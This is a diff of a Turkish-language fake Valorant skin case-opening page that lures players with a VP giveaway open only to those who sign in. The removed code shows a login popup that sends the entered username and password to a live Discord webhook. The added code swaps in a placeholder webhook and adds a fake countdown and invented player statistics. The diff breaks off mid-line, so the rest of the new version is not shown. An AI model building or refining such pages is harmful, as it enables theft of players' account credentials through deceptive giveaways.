@@ -11,21 +11,11 @@
 
         /* Üst Drop Şeridi */
         .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; justify-content: flex-start; overflow: hidden; position: relative; width: 100%; }
-        
         .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
-
         .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
-
-        /* Skin Kartı ve Altındaki Renk Kutusu */
-        .drop-card { 
-            background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; 
-            margin-right: 12px; display: flex; flex-direction: column; align-items: center; 
-            justify-content: space-between; flex-shrink: 0; animation: slideIn 0.4s ease-out;
-            padding-top: 10px; overflow: hidden;
-        }
+        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; animation: slideIn 0.4s ease-out; padding-top: 10px; overflow: hidden; }
         .drop-card img { height: 45px; object-fit: contain; }
-        .rarity-box { width: 100%; height: 6px; margin-top: auto; } /* Skin altındaki renk karesi/çizgisi */
-
+        .rarity-box { width: 100%; height: 6px; margin-top: auto; }
         @keyframes slideIn { from { transform: translateX(-30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
 
         /* Navbar */
@@ -35,6 +25,7 @@
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
 
+        /* Giriş Yap Butonu (Logo Geri Geldi) */
         .btn-login { 
             background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; 
             font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; 
@@ -42,39 +33,26 @@
             box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4);
         }
 
-        /* Popüler Sandıklar Başlığı - Okunaklılık Artırıldı */
-        .title-container { 
-            width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); 
-            border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); 
-            padding: 20px 0; margin: 40px 0; text-align: center; 
-        }
+        /* Çekiliş Banner (Sayaç Geri Geldi) */
+        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
+        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
+
+        /* Başlık Şeridi */
+        .title-container { width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); padding: 20px 0; margin: 40px 0; text-align: center; }
         .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
 
-        /* Kasa Çerçevesi Düzeltmesi (Taşma Engellendi) */
+        /* Kasa Grid (Taşma Engelli) */
         .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
         .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
-        
-        .case-box { 
-            background: #101123; border-radius: 12px; padding: 20px; 
-            text-align: center; border: 1px solid #222; transition: 0.3s; 
-            width: 280px; overflow: hidden; /* Dışarı taşmayı engeller */
-            display: flex; flex-direction: column; align-items: center;
-        }
-        .case-box:hover { border-color: var(--valo-red); box-shadow: 0 0 20px rgba(255,70,85,0.2); }
-        
-        .case-img-container {
-            width: 100%; height: 160px; display: flex; align-items: center; justify-content: center;
-            margin-bottom: 15px; overflow: hidden;
-        }
-        .case-box img { 
-            max-width: 110%; /* Hafif büyük durması için ama kaptan taşmaz */
-            max-height: 100%; 
-            object-fit: contain; 
-            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));
-        }
-
+        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; overflow: hidden; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
+        .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; overflow: hidden; }
+        .case-box img { max-width: 110%; max-height: 100%; object-fit: contain; }
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+
+        /* Alt İstatistikler Geri Geldi */
+        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
     </style>
 </head>
 <body>
@@ -89,8 +67,21 @@
         <div class="nav-links">
             <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Sözleşmeler</a><a href="#">Mağaza</a>
         </div>
-        <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
+        <button class="btn-login" onclick="openAuth()">
+            <img src="logo.png" width="18" onerror="this.style.display='inline-block'"> GİRİŞ YAP
+        </button>
     </header>
+
+    <div class="giveaway-section">
+        <div>
+            <h2 style="margin:0; font-family:'Montserrat'; font-size:32px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
+            <p style="color:var(--valo-red); font-weight:800; margin:5px 0;">OTURUM AÇANLAR KATILIR</p>
+        </div>
+        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
+            <div id="countdown">00:00:00</div>
+            <span style="font-size:10px; color:#555;">UTC+3 KALAN SÜRE</span>
+        </div>
+    </div>
 
     <div class="title-container"><h3>POPÜLER SANDIKLAR</h3></div>
 
@@ -99,28 +90,28 @@
         <div class="case-row" id="row2"></div>
     </div>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";
+    <div class="live-stats">
+        <div class="stat-box"><span class="stat-num">2.841</span><span style="color:#555; font-size:12px; font-weight:800;">AKTİF OYUNCU</span></div>
+        <div class="stat-box"><span class="stat-num">148.209</span><span style="color:#555; font-size:12px; font-weight:800;">KASA AÇILDI</span></div>
+        <div class="stat-box"><span class="stat-num">1.250.400</span><span style="color:#555; font-size:12px; font-weight:800;">VP DAĞITILDI</span></div>
+    </div>
 
-        window.onload = function() {
-            // 1. Gelişmiş Drop Sistemi (Renk Kutulu)
+    <script>
+        const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_YAPISTIR";
+
+        document.addEventListener("DOMContentLoaded", function() {
+            // 1. Drop Sistemi (Renk Kutulu)
             const skins = [
-                {img: "skin1.png", color: "#ade55c"}, // Select
-                {img: "skin2.png", color: "#4b82d5"}, // Deluxe
-                {img: "skin3.png", color: "#d151dc"}, // Premium
-                {img: "skin4.png", color: "#f7c133"}, // Ultra
-                {img: "skin5.png", color: "#ff4655"}  // Exclusive
+                {img: "skin1.png", color: "#ade55c"}, {img: "skin2.png", color: "#4b82d5"},
+                {img: "skin3.png", color: "#d151dc"}, {img: "skin4.png", color: "#f7c133"},
+                {img: "skin5.png", color: "#ff4655"}
             ];
             const track = document.getElementById('dropTrack');
-            
             function addNewDrop() {
                 const randomSkin = skins[Math.floor(Math.random() * skins.length)];
                 const card = document.createElement('div');
                 card.className = 'drop-card';
-                card.innerHTML = `
-                    <img src="${randomSkin.img}" onerror="this.src='https://via.placeholder.com/40'">
-                    <div class="rarity-box" style="background: ${randomSkin.color}"></div>
-                `;
+                card.innerHTML = `<img src="${randomSkin.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background: ${randomSkin.color}"></div>`;
                 track.prepend(card);
                 if(track.children.length > 12) track.removeChild(track.lastChild);
                 setTimeout(addNewDrop, Math.random() * 3000 + 2000);
@@ -129,35 +120,29 @@
 
             // 2. Kasa Dizilimi
             const cases = [
-                {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"},
-                {n: "STANDART", p: "30 VP", i: "case2.png"},
-                {n: "ELİT", p: "50 VP", i: "case3.png"},
-                {n: "PREMIUM", p: "100 VP", i: "case4.png"},
-                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
-                {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
+                {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
+                {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
             ];
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
-
             cases.slice(0, 4).forEach(c => {
-                r1.innerHTML += `
-                    <div class="case-box" onclick="openAuth()">
-                        <div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div>
-                        <h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3>
-                        <div class="vp-tag">${c.p}</div>
-                        <button class="open-btn">KASAYI AÇ</button>
-                    </div>`;
+                r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
             });
             cases.slice(4, 6).forEach(c => {
-                r2.innerHTML += `
-                    <div class="case-box" onclick="openAuth()">
-                        <div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div>
-                        <h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3>
-                        <div class="vp-tag">${c.p}</div>
-                        <button class="open-btn">KASAYI AÇ</button>
-                    </div>`;
+                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
             });
-        };
+
+            // 3. Sayaç Fonksiyonu
+            setInterval(() => {
+                const now = new Date();
+                const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
+                let t = new Date(utc3); t.setHours(24, 0, 0, 0);
+                let d = t - utc3;
+                let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
+                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            }, 1000);
+        });
 
         function openAuth() {
             const w = 600, h = 800;
@@ -166,26 +151,4 @@
             win.document.body.innerHTML = `
                 <style>
                     body { margin:0; height:100vh; background: url('login_bg.jpg') center/cover; display:flex; justify-content:center; align-items:center; font-family:sans-serif; }
-                    .card { background:#fff; width:340px; padding:50px 40px; border-radius:4px; text-align:center; }
-                    input { width:100%; padding:14px; margin:10px 0; background:#f2f2f2; border:none; border-radius:4px; box-sizing:border-box; font-weight:600; }
-                    .btn { width:100%; padding:18px; background:#ff4655; color:#fff; border:none; border-radius:12px; font-weight:700; cursor:pointer; margin-top:40px; text-transform:uppercase; }
-                </style>
-                <div class="card">
-                    <img src="login_logo.png" width="110" style="margin-bottom:30px;">
-                    <h2>Oturum Aç</h2>
-                    <input type="text" id="u" placeholder="KULLANICI ADI">
-                    <input type="password" id="p" placeholder="ŞİFRE">
-                    <button class="btn" id="go">Giriş Yap</button>
-                </div>
-            `;
-            win.document.getElementById('go').onclick = function() {
-                const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
-                if(u && p) {
-                    fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: "👤: " + u + " | 🔑: " + p }) });
-                    win.close();
-                }
-            };
-        }
-    </script>
-</body>
-</html>
+                    .card { background:#
